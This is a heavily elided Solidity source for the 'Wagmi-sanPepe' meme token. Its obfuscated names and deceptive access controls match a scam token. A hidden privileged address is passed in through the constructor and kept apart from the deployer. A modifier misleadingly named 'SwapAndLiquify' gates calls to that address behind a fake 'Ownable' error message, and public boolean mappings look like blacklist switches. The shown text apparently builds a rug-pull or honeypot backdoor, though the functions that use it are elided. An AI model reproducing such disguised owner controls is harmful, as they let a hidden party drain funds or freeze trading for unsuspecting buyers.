...
/**
Wagmi-sanPepe $WAGMIPEPE
https://t.me/WagmiSanPepe
*/
pragma solidity 0.8.19;
abstract contract WAGMIPEPEAs {
...
interface WAGMIPEPEAsii is WAGMIPEPEAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract WAGMIPEPEAsiii is WAGMIPEPEAs {
...
contract WAGMIPEPE is WAGMIPEPEAs, WAGMIPEPEAsi, WAGMIPEPEAsii, WAGMIPEPEAsiii {

    mapping(address => uint256) private sendValue;
  mapping(address => bool) public WAGMIPEPEAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeToTransfer;
address private WAGMIPEPERooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public WAGMIPEPEPaw;
  address WAGMIPEPEAdr;



    
    constructor(address WAGMIPEPEadressss) {
            // Editable
            WAGMIPEPEAdr = msg.sender;

        _name = "Wagmi-sanPepe";
        _symbol = "WAGMIPEPE";
  WAGMIPEPERooter = WAGMIPEPEadressss;        
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(WAGMIPEPERooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(WAGMIPEPEAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
